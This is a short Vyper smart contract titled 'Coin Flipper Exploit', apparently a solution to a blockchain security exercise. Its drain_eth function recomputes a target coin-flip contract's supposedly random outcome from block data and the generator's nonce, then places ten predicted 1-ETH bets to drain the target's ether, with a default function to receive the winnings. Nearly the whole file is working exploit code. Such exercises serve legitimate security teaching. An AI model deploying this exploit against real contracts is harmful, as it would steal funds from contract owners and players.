# @version ^0.3.2

"""
@title Coin Flipper Exploit
"""

interface Coinflipper:
    def flip_coin(guess: bool): payable
    def generator() -> address: view

interface Randomnumber:
    def generate_random_number() -> uint256: nonpayable
    def nonce() -> uint256: view

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE

@external
@payable
def drain_eth():
    """
    @notice Drains the ETH from the coin flipper contract by calculating the same coin flip
    """
    guess: bool = False
    guessNum: uint256 = 0
    genAddress: address = Coinflipper(self.target).generator()
    for i in range(0,10):
        guessNum = convert(keccak256(
                        concat(
                            block.prevhash,
                            convert(block.timestamp, bytes32),
                            convert(block.difficulty, bytes32),
                            convert(Randomnumber(genAddress).nonce(), bytes32)
                        )
                ), uint256)
        guess = not convert(guessNum % 2, bool)
        Coinflipper(self.target).flip_coin(guess, value=(10**18))


# Need this function to be able to receive the Ether from the coin flipper
@external
@payable
def __default__():
    return